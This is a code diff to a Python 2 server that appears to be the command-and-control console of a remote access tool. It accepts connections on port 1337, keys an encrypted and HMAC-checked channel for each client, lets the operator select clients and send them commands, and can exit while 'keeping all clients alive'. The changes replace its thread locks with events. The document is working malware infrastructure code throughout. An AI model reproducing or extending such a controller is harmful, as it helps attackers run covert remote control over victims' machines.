@@ -88,7 +88,7 @@ class Server(object):
     def __init__(self, port=1337):
         super(Server, self).__init__()
         self.count          = 0
-        self.lock           = threading.Lock()
+        self.lock           = threading.Event()
         self.current_client = None
         self.clients        = {}
         self.commands       = {
@@ -106,6 +106,7 @@ class Server(object):
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
         self.s.listen(5)
+        self.lock.set()
 
     def pad(self, data):
         return data + b'\0' * (AES.block_size - len(data) % AES.block_size)
@@ -135,8 +136,7 @@ class Server(object):
         hash_check  = ciphertext[-SHA256.digest_size:]
         verify      = HMAC.new(dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
         if verify  != hash_check:
-            with self.lock:
-                print "Warning: HMAC-SHA256 hash authentication failed"
+            print "Warning: HMAC-SHA256 hash authentication failed"
         return cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size]).rstrip(b'\0')
 
     def deobfuscate(self, block):
@@ -173,17 +173,20 @@ class Server(object):
                     return b64encode(block)
 
     def select_client(self, client_id):
+        if self.lock.is_set():
+            self.lock.clear()
         if self.current_client:
-            self.current_client.lock.acquire_lock()
+            if self.current_client.lock.is_set():
+                self.current_client.lock.clear()
         self.current_client = self.clients[int(client_id)]
-        self.current_client.lock.release_lock()
-        with self.lock:
-            print '\nClient {} selected\n'.format(client_id)
+        print '\nClient {} selected\n'.format(client_id)
+        self.current_client.lock.set()
         return self.current_client.run()
 
     def deselect_client(self):
         if self.current_client:
-            self.current_client.lock.acquire_lock()
+            if self.current_client.lock.is_set():
+                self.current_client.lock.clear()
         self.current_client = None
         self.run()
 
@@ -228,12 +231,10 @@ class Server(object):
         print '\n'
 
     def print_help(self):
-        with self.lock:
-            print HELP_CMDS
+        print HELP_CMDS
 
     def quit_server(self):
-        with self.lock:
-            q = raw_input('Exit the server and keep all clients alive (y/N)? ')
+        q = raw_input('Exit the server and keep all clients alive (y/N)? ')
         if q.lower().startswith('y'):
             try:
                 for client in self.get_clients():
@@ -243,21 +244,12 @@ class Server(object):
             finally:
                 sys.exit(0)
 
-    def get_client_info(self, client=None):
-        client = client or self.current_client
-        if client:
-            self.send_client('info', client)
-            method, message = self.recv_client(client)
-            client.info     = message
-            return client.info
-
     def client_manager(self):
         while True:
             conn, addr  = self.s.accept()
             name        = len(self.clients) + 1
             client      = ClientHandler(conn, addr, name)
             self.clients[name] = client
-            client.lock.acquire()
             client.start()
             if exit_status:
                 break
@@ -268,26 +260,22 @@ class Server(object):
         while True:
             if exit_status:
                 break
-            if self.current_client:
-                self.lock.acquire_lock()
-            if not self.current_client:
-                output = ''
-                with self.lock:
-                    cmd_buffer = raw_input('$ ')
-                cmd, _, action = cmd_buffer.partition(' ')
-                if cmd in self.commands:
-                    try:
-                        output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
-                    except Exception as e1:
-                        output = str(e1)
-                else:
-                    try:
-                        output = subprocess.check_output(cmd_buffer, shell=True)
-                    except Exception as e2:
-                        output = str(e2)
-                if output and len(output):
-                    with self.lock:
-                        print output
+            self.lock.wait()
+            output = ''
+            cmd_buffer = raw_input('$ ')
+            cmd, _, action = cmd_buffer.partition(' ')
+            if cmd in self.commands:
+                try:
+                    output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                except Exception as e1:
+                    output = str(e1)
+            else:
+                try:
+                    output = subprocess.check_output(cmd_buffer, shell=True)
+                except Exception as e2:
+                    output = str(e2)
+            if output and len(output):
+                print output
 
 
 class ClientHandler(threading.Thread):
@@ -302,14 +290,14 @@ class ClientHandler(threading.Thread):
         self.name   = name
         self.info   = {}
         self.dhkey  = server.diffiehellman(conn)
-        self.lock   = threading.Lock()
+        self.lock   = threading.Event()
                 
     def run(self, prompt=None):
         while True:
             if exit_status:
                 break
-            with self.lock:
-                method, data = ('prompt', prompt) if prompt else server.recv_client()
+            self.lock.wait()
+            method, data = ('prompt', prompt) if prompt else server.recv_client()
             if 'prompt' in method:
                 command = raw_input(data % int(self.name))
                 cmd, _, action = command.partition(' ')
